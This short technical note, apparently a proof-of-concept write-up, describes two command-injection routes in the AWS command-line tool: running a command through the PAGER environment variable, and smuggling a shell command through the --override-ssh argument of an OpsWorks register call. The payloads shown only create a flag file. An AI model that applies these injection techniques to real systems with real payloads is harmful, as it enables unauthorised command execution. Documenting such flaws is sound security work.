If you can set environment variables, there's a simple command injection in the
`aws` tool via the `PAGER` variable.

```
PAGER='touch /tmp/flag' aws help
```

If you cannot set environment variables, but you control the account being acted
upon, you can create an OpsWorks stack and run the following command:

```
aws opsworks register \
  --stack-id <stack-id> \
  --infrastructure-class on-premises \
  --override-ssh 'sh -c "touch /tmp/flag" -- ' example.org
```
